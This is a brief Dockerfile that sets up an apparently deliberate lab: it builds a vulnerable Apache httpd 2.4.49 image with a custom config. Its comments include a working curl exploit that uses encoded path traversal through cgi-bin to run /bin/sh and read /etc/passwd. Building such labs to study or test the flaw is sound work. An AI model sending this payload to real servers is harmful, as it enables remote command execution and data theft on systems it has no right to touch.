# Build image: docker image build -t httpd-rce .
# Run image: docker run --name httpd-rce --rm -dit -p 3000:80 httpd-rce
# curl 'localhost:3000/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;cat /etc/passwd'
FROM httpd:2.4.49
COPY httpd.conf /usr/local/apache2/conf/httpd.conf
